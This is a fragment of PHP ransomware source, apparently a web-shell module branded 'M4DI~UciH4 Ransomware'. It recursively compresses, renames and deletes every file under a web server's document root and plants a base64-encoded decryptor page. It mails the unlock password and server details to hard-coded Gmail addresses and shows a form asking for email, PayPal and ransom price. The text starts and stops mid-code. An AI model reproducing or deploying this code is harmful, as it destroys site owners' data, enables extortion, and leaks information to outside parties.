$ht=fopen('.htaccess','w');fwrite($ht,$hta);fclose($ht);echo "$filename Encrypted !!!<br>";}function encdir($dir){$files=array_diff(scandir($dir),array('.','..'));foreach($files as $file){if(is_dir($dir."/".$file)){encdir($dir."/".$file);}else{encfile($dir."/".$file);}}}if(isset($_POST['pass'])){encdir($_SERVER['DOCUMENT_ROOT']);}copy('m4d1.php',$_SERVER['DOCUMENT_ROOT'].'/m4d1.php');copy('.htaccess',$_SERVER['DOCUMENT_ROOT'].'.htaccess');copy($_SERVER['DOCUMENT_ROOT'].'.htaccess',$_SERVER['DOCUMENT_ROOT'].'.htabackup');$to=$_POST['email'];$subject='M4DI~UciH4 Ransomware Informasi';$message="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];$too='indomilk87@gmail.com,syahrinisayang@gmail.com,maulidazha587@gmail.com';$title='M4DI~UciH4 Ransomware Informasi';$pesan="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];if(mail($to,$subject,$message))if(mail($too,$title,$pesan)){echo 'Password Saved In Your Mail !!!';}else{echo 'Password Not In Your Mail !!!';}exit();
}
?>
	<pre>
<h2><center><font color=red>M4DI~UciH4 Ransomware</h2></font></pre></center>
<form enctype="multipart/form-data" method="post" style=" text-align: center;">
	    <input type="text" name="email" placeholder="Your Email">
		<input type="text" name="paypal" placeholder="Your Paypal">
        <input type="text" name="price" placeholder="Your Price">
        <input type="password" name="pass" placeholder="Password">
        <input type="submit" value="Encrypt">
        </form>
<?php
 }
if(isset($_GET['do']) && ($_GET['do'] == 'ransom')) {
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.m4d1') !== false) {
    return;
	}
	file_put_contents($filename.".m4d1", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
$file = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAia29udG9sIjsNCmlmKGlzc2V0KCRpbnB1dCkpIHsNCmlmKG1kNSgkaW5wdXQpID09ICRwYXNzKSB7DQpmdW5jdGlvbiBkZWNmaWxlKCRmaWxlbmFtZSl7DQoJaWYgKHN0cnBvcygkZmlsZW5hbWUsICcubTRkMScpID09PSBGQUxTRSkgew0KCXJldHVybjsNCgl9DQoJJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsNCglmaWxlX3B1dF9jb250ZW50cyhzdHJfcmVwbGFjZSgnLm00ZDEnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7DQp1bmxpbmsoJ2Rqb2F0LnBocCcpOw0KCXVubGluaygkZmlsZW5hbWUpOw0KCWVjaG8gJzx0aXRsZT5NNEQxIFJhbnNvbVdhcmU8L3RpdGxlPjxib2R5IGJnY29sb3I9IzFBMUMxRj48aSBjbGFzcz0iZmEgZmEtdW5sb2NrIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8Zm9udCBjb2xvcj0iI0ZGRUIzQiI+VW5sb2NrPC9mb250PiAoPGZvbnQgY29sb3I9IiM0MENFMDgiPlN1Y2Nlc3M8L2ZvbnQ+KSA8Zm9udCBjb2xvcj0iIzAwRkZGRiI+PT48L2ZvbnQ+IDxmb250IGNvbG9yPSIjMjE5NkYzIj4nLiRmaWxlbmFtZS4nPC9mb250PiA8YnI+JzsNCn0NCg0KZnVuY3Rpb24gZGVjZGlyKCRkaXIpew0KCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsNCgkJCQlkZWNkaXIoJGRpci4iLyIuJGZpbGUpOw0KCQkJfWVsc2Ugew0KCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOw0KCQl9DQoJfQ0KfQ0KDQpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7DQplY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+PGJyPkRlY3J5cHRlZDxicj4nOw0KdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5zdWNlc3MgISEhJzsNCn0gZWxzZSB7DQplY2hvICc8dGl0bGU+TTREMSBSYW5zb21XYXJlPC90aXRsZT4NCjxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjY2MxMDE3Ij4NCjxib2R5IGJnY29sb3I9IzFBMUMxRj4NCjxwcmU+DQo8Y2VudGVyPjxoMT4NCjxmb250IGNsYXNzPSJpbWciIGNvbG9yPSJyZWQiPg0KICAgICAgICAgICAgICAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgwrbCtsK2wrbCtsK2ICAgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2ICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICDCtsK2wrbCtiAgICAgICAgICAgICAgICAgICAgICAgwrbCtsK2wrYgICAgICAgICAgICAgIA0KICAgICAgICAgICAgIMK2wrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICAgIA0KICAgICAgICAgICAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICAgDQogICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtiAgICAgICAgICANCiAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgIMK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtsK2ICAgICAgICAgIA0KICAgICAgICAgICDCtsK2IMK2wrYgICDCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2ICAgwrbCtiDCtsK2ICAgICAgICAgICANCiAgICAgICAgICAgIMK2wrbCtsK2IMK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtiDCtsK2wrbCtsK2ICAgICAgICAgICANCiAgICAgICAgICAgICDCtsK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2IMK2wrbCtiAgICAgICAgICAgICANCiAgICDCtsK2wrYgICAgICAgwrbCtiAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgIMK2wrYgICAgICDCtsK2wrbCtiAgIA0KICAgwrbCtsK2wrbCtiAgICAgwrbCtiAgIMK2wrbCtsK2wrbCtsK2ICAgwrbCtsK2ICAgwrbCtsK2wrbCtsK2wrYgICDCtsK2ICAgICDCtsK2wrbCtsK2wrYgIA0KICDCtsK2ICAgwrbCtiAgICDCtsK2ICAgICDCtsK2wrYgICAgwrbCtsK2wrbCtiAgICDCtsK2wrYgICAgIMK2wrYgICAgwrbCtiAgIMK2wrYgIA0KIMK2wrbCtiAgICDCtsK2wrbCtiAgwrbCtiAgICAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICAgICDCtsK2ICDCtsK2wrbCtiAgICDCtsK2wrYgDQrCtsK2ICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgICAgICAgIMK2wrYNCsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgwrbCtsK2wrbCtsK2wrbCtg0KICDCtsK2wrbCtiDCtsK2wrbCtsK2ICAgICAgwrbCtsK2wrbCtiAgICAgICAgICAgICAgwrbCtsK2IMK2wrYgICAgIMK2wrbCtsK2wrbCtiDCtsK2wrYgDQogICAgICAgICAgwrbCtsK2wrbCtsK2ICDCtsK2wrYgIMK2wrYgICAgICAgICAgIMK2wrYgIMK2wrbCtiAgwrbCtsK2wrbCtsK2ICAgICAgICANCiAgICAgICAgICAgICAgwrbCtsK2wrbCtsK2IMK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrbCtiDCtsK2IMK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICDCtsK2IMK2wrYgwrYgwrYgwrYgwrYgwrYgwrYgwrYgwrYgwrbCtiAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgwrbCtsK2wrYgIMK2IMK2IMK2IMK2IMK2IMK2IMK2IMK2ICAgwrbCtsK2wrbCtiAgICAgICAgICAgICAgDQogICAgICAgICAgICDCtsK2wrbCtsK2IMK2wrYgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgIMK2wrYgwrbCtsK2wrbCtiAgICAgICAgICAgIA0KICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2ICAgICAgICAgICAgICAgICDCtsK2ICAgICAgwrbCtsK2wrbCtsK2wrbCtsK2ICAgIA0KICAgwrbCtiAgICAgICAgICAgwrbCtsK2wrbCtsK2wrYgICAgICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICDCtsK2ICAgDQogICAgwrbCtsK2ICAgICDCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrYgICAgIMK2wrbCtiAgICANCiAgICAgIMK2wrYgICDCtsK2wrYgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgwrbCtsK2ICAgwrbCtiAgICAgIA0KICAgICAgwrbCtiAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgwrbCtiAgICAgIA0KICAgICAgIMK2wrbCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrbCtsK2ICAgICAgIA0KPC9mb250Pjxicj4NCjxpPg0KICAgICAgICAgICAgPGZvbnQgY29sb3I9InJlZCIgc2l6ZT0iMjAiPldyb25nIFBhc3N3b3JkICEhITwvZm9udD48L2k+DQo8L3ByZT4nOw0KfQ0KZXhpdCgpOw0KfQ0KPz4NCgk8IS0tLS0tLS0tLS0tLSBNNEQxIFJhbnNvbVdhcmUgLS0tLS0tLS0+IA0KPGh0bWw+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD13aW5kb3dzLTEyNTIiPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiPg0KPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ik00RDF+VWNpSDQiPg0KPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IiBSYW5zb213YXJlLCBSYW5zb213ZWIsIEhhY2tlZCwgTG9ja2VkLCBFbmNyeXB0ZWQiPiANCjxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iTTRESX5VY2lINCI+DQo8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9ImluZGV4LCBhbGwiPg0KCTxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1JY2VsYW5kJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1NZXJpZW5kYScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9VWJ1bnR1JyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1TaGFkb3dzK0ludG8rTGlnaHQnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPjxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvcG5nIiBocmVmPSJkYXRhOmltYWdlL2pwZWc7YmFzZTY0LC85ai80QUFRU2taSlJnQUJBUUFBQVFBQkFBRC8yd0NFQUFrR0J4SVRFaFVURWhJVkZoVVZGeFVZR1JnWEdCc1hGUmNZR0JVV0doa1hGeGNaSFNnZ0dCc2xHeFVWSXpJaEpTa3JMaTR1Rng4ek9ETXROeWd0TUNzQkNnb0tEZzBPR3hBUUZpMGxIUjB0S3kwdEt5MHRMUzByTFM0ckxTMHRLeTByTFMwdExTMHRMUzB0TFMwdExTOHRMUzB0TFM0dE55c3RMU3N0TFNzdExmL0FBQkVJQU5zQTVnTUJJZ0FDRVFFREVRSC94QUFjQUFFQUFRVUJBUUFBQUFBQUFBQUFBQUFBQmdFREJBVUhBZ2oveEFBL0VBQUNBUUlEQlFZQ0J3Y0VBZ01BQUFBQkFnQURFUVFTSVFVR01VRlJFeUpoY1lHUkI2RVVNa0tDc2NId0kxSmljcUxSOFlPU3N1RWtVd2dWUS8vRUFCa0JBUUVCQVFFQkFBQUFBQUFBQUFBQUFBQUNBUU1FQnYvRUFDRVJBUUVBQWdJQ0F3QURBQUFBQUFBQUFBQUJBaEVESVJJeFFWRmhCQlN4LzlvQURBTUJBQUlSQXhFQVB3RGhzUkVCRVJBUkVRRVJFQkVSQVJFcUJBcEV1L1J6YS9DMm12WHA1K0V0MmdVaVZ0QWdWQzNsRE0vQVVkQzBzWTJuWnRPRW1aeTNUMFpmeDhzZU9jbjJ4b2lKVHprUkVCRVJBUkVRRVJFQkVSQVJFUUVSRUJFUkFSRXVVcVJiaDc4aDVtQmJucktablVjTFQrMDk3Y2NvMEhoYzhmUzgyK3pVcEFCeFFQZUpDQTZ1NUdoWUMyZ0IwdUNCZlMvR0JINldFZGhkVVlqd1VuOHBuN0YyUFVydmxTd090MmE0QzhMazJGOUx5U0pqQ1dBT2hKSUNJU3pYNmFXRngwc0xTVVlDbldwMUVJcGwyY1pXVWhiaFNMZDl3M2R0NDhMZTBYSnVrZncrNzZITmxVWmFZQXpWQmZLUDVMaFFUeDd4Sk9wQVBMVzQvQ1ZRTDlyWk9BNUQraGNzbFdBeG9laVVEc0tsTm4wUUxtelhKSUhhS1FYSUY5QmUzRFFTM2h0dHMxeW1KcU5hd1phOW5BSjVNQ0xLRDFDMjQ2NmFaTFd1Y1ZxV3ZlWWVmRWZnQ0phR0hOeHdzZVlOeE9qYlQzZnBZZ1prVmFOWWFrcnBUTjlBV0Y3WlNTTzhMQzVGN2FTSVY4RzFNNVhYS3dMQmh3MUhIVGtadHk2MnZoNC9Qa21QMlVxZGxFeGNUUnpBOVJNNTNHVStCQW1MbTVUeVlXNzIrajVzY0xoNGZHbW5ZR2VKbllwQmU4eEtpMm5zeHUzem5MeFhDNmVJaUpUa1JFUUVSRUJFUkFSRVFFUkVCRVJBUkVRS2llcms2ZktVcG9TYkNiTEJVVlUzSXpHOWdCemM4QVBXMzY0QmMyVnN0cXpxdDh0TUhWam9PckVkVFlFK1FtN3JWMUlad0dGT3dDajZwcUtORlhxdE1DMWhjWHVTM0hYM2gxQzlvdDdyU1N6bmlHZDJWY2dQUWdrZVFtTmlLMloxUzE3V1poelBOYVk2RTNVZmY5cGEzbXhNT0V5bkxaMlZuWmdOVW9vTGxVL2R1U3FpM01ubnc2THMrcGtBU3dEQUxtQTRCbkpGaDRLaU9PdDllSjBqbXdjSGVvUzNEOWpUODFWVFdjOU85Y24vQUJOazFVaXNvUDJrcTFENnFhWS9xcG4za1ZxSWJ4N0tOTS9TYVl1SHNXR3RyT3pGZlM0R3ZFRXJ6dE1TalM3WTl0UUk3WlJleDRWVjVxNDRYNGpsY2kzVnBNcVNqc0tZcWpSdzQ4MU5Pbm1VZEdIWmh3ZjREek1qZUoyYWNOV0JVNlBkaGI2dVlFQnlCd0NrbWxVQS9kcmtkWnVOSzk3TXhLcXltbDNTd3YyYi9WYmt5b1RvRzFZWlRvYitONTYrSjJIb2loaDhSUzBxWmpUWkNiVkNvVzl5cDczZHNGdjBaZU9oT1hpTm5xN0JnQlo3VkI0TVFDM0hpQ1F1blBNVHptcDNoMlBpTVRlb0NwRklDa3dOOHlxdWRnUmUvSHZqN3NtdW5IZFhlOUlFY1dTTFR5ek5hK3Y2OHBQSzJ6OEZpUDJWR2tjTFhVRExmdks5aGJWYmttNVU2Z2tnMzQ4SkQ5b1Vub3VWZGJGU0xpOXdRZWg1Z2puNFM1SjlOeTUrVEwzV3RiTnhsdDJ2TmxXcEJkRHFwNStEYWcvaDg1cnFxV0pIU1U0MjJ2RVJFMWhFUkFSRVFFUkVCRVJBUkVRRVJFQktnU2s5MHpiWDJnWGIyN280bmlmeUUydXpiQ29OQ2V5Vm10eEpZRFFEeHpFZXZXd210MmNvekZqd1VGaitYeklteDJTMWpWZm1vUUQrWm4wUG1HQWI3cG1VYk0xQWltbmUrVVozdDl0N2huOHhsNGZ6UnNPaVRWcHMycE9hcWY4QVRXcFZIb1dTbjdBVFdrazFzbzRLR3YwNkVmcnJKUHM1Y3VMZGVBU2k0OWtvZmhtTXhyb0MwZ0s3MGhvVlhKNnRTcXI4c3dsL2JkRUhHVlZVY01OUjlDN09iZjFEM2xocXYvbllrbml0U243T0t5ajU1ZmVlKzNGU3Z0Q3RmUU1sTmZJR21vK1lhYzlxMDhiUXAzUkZYb2FpZExqVUQxNFRYNHJEWnNQbDQ5azRLMy9kc2NsOWVPVTFhWkd1cW8yZ0UzZTdORmNSU29PeHNQb2dieXVGbU5pS0ZpVVBCaGxQandJK2VsK2hick14blRNcnFzUFpOUFBUeWZhVXNCejRxV3oreWtTeHV4WHo0c28yZ3IwVkp2d0xxQXdIbUFyWHYvN2pOM3N2QUZLcmEzQUttL2d6TUQ3M2IyRTBGT2thZUlSdi9YV1pSL0k3Z2Eramtla2IyMW85NDhIMlJaaGY5bXpFRWZXdGU1QVBXMm84cHI5NWNJSzlEdGJET29zeEhBODcrQWJ1dW81QXYxazIzbjJmbkpITjZwUzNpM2NYNWdTTGJPcDN3eEIxN3JvZkUwaVJmeTdJb1B1UzVXT2VOVnVnQjZXL01majhwalZPWFhnWm1QUzA4ODl2dTk2V0RTdUxqOWN4T2lXTkVyS1FFUkVCRVJBUkVRRVJFQkVSQVJFUUVSRURJcFBaYkQ3UitRL3pNM1pOU3dQZ3djOU81VHEyK1pJOVpqWU5CcXpjRUh6SjAvT1c4UFZzdFQrSlFQWE9wL0FOQTJ1QXAzY0U2M0RmSUEvaEpvTUtmcEZlM0VuRW9QTTBxTEQ4SkdOMjZlZW9uUXNWOXlvL3RPaDA4SVBwS3NSeHFvU2VWNjlOcUJ0NUVFKzA1NU5pL2pzYmJhQVlmVnJwU2J6SUNPdi9BQmYzbURzYkZuNkp0QnVKR0pvZXh4SS9ML2pOYnR5b3c3RmhvMUJub05iazFHb0tsRWVacDFBUHV0MGw3WmVWS2VLcERUdDJvMis3VVlnLzFDUjNGSnZ1WGhyWWJEcXhBQ1VCbXZ4eWpNUVBrUGJ4a0kzcjMrVkdLVVVETUc1bXdYajA0NjhwTmQ0YUQwY05VVmRDYUNnVzZCZFo4OXJVeTFNekM5bXZZOENRZWZoS3dqTlMzdDNmY1Rid3hlVU9SZW9wVTI0OXdxZitLdjd6VjRscmxtSElDL24yck1ENDZWRjlwRnZoNXRXbytPRlhLQURVTndpNVVYTmg4VmV3R2dHZ05wSjltVWkzWmh2L0FOS1ZWaUR5c3RES1BuSnMxVldwUnZtZ3B2VGNjRFZTcDZxbFUvaUpGS09FQ1BWUWNGY05mbDlZcS84QVRKRHZkVjdUNkd2NzZOL3V5a2ZpVDd6VVk0V2FwMWRYL3FJdCtNUmpsUm8yVkZQRVp3ZlVVeC9lWXRCUmxZRTJzUlk5Q09GL0RXMGttS3dnT2FwYmt6ZUFzTC9QS1pIMXc1RkJtUE1oZncvTW1kVXRaWHBrRTZXOE9uL1V0VDMycHRia09IaFBFcGhFUkFSRVFFUkVCRVJBUkVRRVJFQktnU2t2VW15Ni9hNWVIajV3TCtLYktvcGpqZk0zbmJSZlFmTW5wTVNVSmwxVTB2NS9yOWRZRXIzU1VpbXJqaXJtMzh3SVlmbjdUcXUwc0dEa2FtYkE5MWZBdU8wcFA1Zlc5eDRUbSt3OHFJbUhQMXdpVmoxdVN4eW5vY2oyblV0aHV0YkNaU2UvVEFway91cVdIWlA1TFVSZlFOT1dhb2d2eEZxZGhpUld5M29ZeEZxa2Z1MVVKRFc4Vll1cC9ocTI2U3h1enRtamlLeUt3S3NwUEhVRy9EVWNiRzAzMitySXl0UXJxY3JFVjZYTmtjZDExVWZhc1FWWkJ4RmlPOWJOQ04yZG5WbTdURUJBVG11b1hSVDlxNkRoYnA3UlBUZE8vYnc3TjdTa2c2MHdEN1RuZGY0WGpGMU80dVFEaS9EcWJEcWJrenBHejk0bHEwcVpwYXFRbzRhalRYTjBtMEcxYVZKQWFqS3JNU0FvK3N4NktvMUo4cHNTZzJ5dDBLT0JCVkFvYmdXYnJsS2p5K3RNZkdHbWE2NUNwc0s5ckcvZEdIcHZ5OEZFOTc1YllyVjZaRkNtYU5PcUhQYjFpVnN0TmdIeW9POW1GaWJmd3lLL0RiRGx5ejN2bStrTUw4VG1EVVI1Q3lySXZ0MThMcmRicmJDbnRjQ25SbXY0QktlWW41Q1llMEZKeW5pV1JRYmVSL3NQYWIvYTlFTldKdDlWS2lEenFsRXVQSEtyVFZpbGN0WTZaMlVlQUFCYnk3cXVmdkxHMG9UdHhzcVZFSEpWWDUzWStWZ2Rla2pXMENCaEF2TU5USi8xTzBlM3BhYi9BSGlxQ3pBbldvMXRQc29BMS9ld1dRMnZpOHdjbmc3WDhpb0dVK3hZZXM2NG9yQWlJbE1JaUlDSWlBaUlnSWlJQ0lpQWlJZ0lpSUhwRnViVE1WMUREUzRVQTI2Z2E2L00yOHBZdGxIaWZ3bGVSSjUvZ1AwUGFCbDRIYUxpdjJ4TjJGMko2K0h2YWRUM1MydU94YkVVd0NBTXJvVFpXREtiMDN0cU84aWdIK05TSnlEZ0xkZVBwSnB1RmlpaXN0OU1SWG9KYm9LU3RVcU40QVhUejFrNVRjVk9rNjJrMURHVVFxc0dyVW16VTFZaFdmUUJxVGNpYldPbkhLckRsTmxzVEdVYlpYSVEyK3EzZEtubmNOYWNyeDdGaFdJR1h2dnc2ZG95alR5dC90bUxYMmcrSVJGYW9SVVFXQUorc05SY01UNlduTzQyVHBXT3NyMjZwVTNucFUyZWxobXBnL2JyUHBoNlJ0cG5JMUpOckFEbnBlUWJhWHhJclpyNFBPckhzWEwxU3IxRnFwbkQ1RGF3cHVyS01tZ0ZqWUM1dkZLMWV1S1pvczFrVXNDQWREM2dTRGJSaG1XK3ZQaFBXeTZWRU12YnN5VXpxeFVabnQwVUhRbmh4amVub3g0ZC9rU3pZdUtyMTZMMThXd3FVYU5kOFFGSkF6WWlwWTlrdDlRR0Y3S3ZqT2g3UHd0TForRVJpTzhtR1ZTUnpkbkRra2VZcUg3cG5JMzJzYXVXblRRTFRRTGxwajdUSXBIYXQvRVJjZXM2cmpsT01GQ21XL1ovVmUzUHVxZVBKdUE5RzZ5ZDd2WnpZZU9FMWVxM3FiTHFWMkdVZDIvZWZsYnNRTk9wQnFzZW5jbVpWMkN0UEQyQ2t2WjlUcVNhckVrbjBNM2RUYXRIRHBrc2JvcWpJaWwyNERRS29KTWdlOXZ4R3hLZ3BodG00aHpyMzNSZ28xUEJWQkowSFVjWnN4Mjh1MEMzMjNkcW9sMUJKY3N4NTJXeWdBZXplODVvNEkwblVsK0sxNm1URjRSV1FkMG1tU0tnSTQ2UG9kYjZYRXo5cmJvNExIMERpY0M0UFcyaktiZlZkZUlQbk9zNlpYRzRtYnRUWnRTZzVTb3BCSFBrZktZVXBoRVJBUkVRRVJFQkVSQVJFUUVSRUJMdElEaWVYTHFmN1MxRUQyTHNmRXk5VklGZ09JQUg1L25MTk5yRy9nZndudCtOK29nZW1HaDhMZlA5R1NiZDljdFNtdXZjcFZXdDFlcW1VZXVXb1BhUnpDcmRsSEptQVBseG00MmZpN1ZsWUhpeEZ2NWdRdjY4SmxHOXJVZjJ6b2Z0NTdqd2F6QS83YXBIbklsak1PUXhCNUUraDRYSGdkSk45NkJaYVdKVDdHVytsN29WNTljMU5oNkxOVnZGUnAxS2ExNlp5NXU2L01aMUh5dUw4ZjNUNGtaSzJ0TGsvWWduamZYWFhYL0V4Y1l3QkE1VzBseWlRVUlINnROYzVQUGxPZU9QYjM4M0xyQ2ErWi9qSncySXk2ampiUTlQR2R2K0V1eTN4Rk5TVGFuVGRpeDV1VGxOZ2ZNSDBuRmRoWUZxMVZVVVhKTnA5YmJuYklYQzRTbFNVV0lVRnZNaldiWnZKd3VWbkYzOCttMnA0ZFJld0F2eDhmUHJNYkZZT21RZEFEMW1iYWEvYXVFekRNRFpoTHNlZU9XZkVUY0JNVm1xVXdGeElCSVlhQ3JiN0xqcjBhY2MzYzI3WDJmaU8wUzRLa3JVcHRvSEFQZVJ4eVBIWGtaOUh0VU45ZU00MThZOWhDbmlGeFNDeTE5SHR3RlFEajZnZTRNWTM0YlV1Mi9zbkQ3UXc2NGlpQVZxTGNkUWVhbm93Tng1aWNYMnBzOTZMbEdIbDR5V2ZEWGUzNkxVTkNxMzdDc2VKNFUzNEIvQlRvRDZIbE4zOFN0akFqdEZGalluMUhFUjZZNVpFUktZUkVRRVJFQkVSQVJFUUVSRUJFcXEzbDNFNFY2WnkxRVpHNk1wVTI2Mk1DelBRYWVaV0Jjb1ZDckE5Q0RMeHJDOXdmRHhGaVNEK3ZHWWtRSk4vd0RmbHFRUTJOaFlnNmdyY20zb1RjSGx3NFRXNFBhaFFNaFhOVGZSbEo2Y0NEeUk1SCs1dnE1VUM4YUd3d2pxcm14SlhYam9mQy9qTUp4ckxsSkNyV1lFSG9SWWpUcEx1ejhJOWFzbEpCZDNZS1BYbjdTZGR1MXlsd2svWFYvZ1p1MTJsVTFtWHVvT1BVOGgrUHRPL0FUUWJrYnVyZ2NLbEVhdGE3bnF4R3NrRVl6WHRuTG5Nc3V2VTlFd01YWE9vdE0rYTdhZUpWYkFrWE1aT2NSaXN2ZU1qdS9tekJpY0RWUzEyQXpwL01tdnpGeDZ5VjR4QUNUeXNKQVBpRnRtcFN3anRSY28xMEFZY2RXRng2aVRHdUZ6bys3TzNQcE9FYkQxVCsxb2k2c2VMVStIdXVnOGlQR2M1WnI2OVo3dzJJWkdES2JFVHBVc3JiV0U3S3FWNUd4SGtaZ1Mvak1VMVE1bTQydExFQkVSQVJFUUVSRUJFUkFSRWxYdzJ3dUdxNHdVc1NBVnFJNnBmaDJtaEh5RFc4YlFOVHV6aVJTeGVIcUVBaGF0TW0rb3RtRjVNUGpJdi9tRS93QUlzWmpiNzdrMWNLK2FtTTFNbTRJRnJhK0U4N3piVHA0bW5TWTVqV0NBMXJpMXNvQ2p5ek13MW5PNVBSeDhlN2YxRWpneUZ6SGdUYS81ZUI4SXh1ejNwMnpEUmxES2VSQi9NY3hNMmlNM2RBdnB5NWFIWFQwa3orSmRPblJ3MkNvQkFDUzd0MUdWVlVEMXpIMmlaWGF1WGp4eDZqbWtUWUNnTDNLMkI2Zjl6elV3eW5WZEJOODRuK3RuWnVNalpPNzliRVVxMWFtVXkwUUMyWnJFM0JObDA4T2RwUEgyTnM3QlZNNHpHdGgxN1JReHpJL2NBUm5CRmdlMFlXQXRxdlNSQWJYZjZQMkZPbUFEVENWQ3E5NGtPeEJMRGpvZWZDNW1Iak1YVnJPNzFHK3ZiTjkzZ0xlY1dzeDQvd0FidXZ2SlR4T0dxVThUVFZzUmNHbldzTTlzNEpVc05ScGZUaEpOOER0Z0kyT3FWM0diNk9pTlRBMUdhc0RZbnhWYmkzOFhoT1pwVHltLzR6dDMvd0FkYUZoaTJQRTlsN0FOTWwrbFo0WHgzWTdPSldVbURqY2NGSGp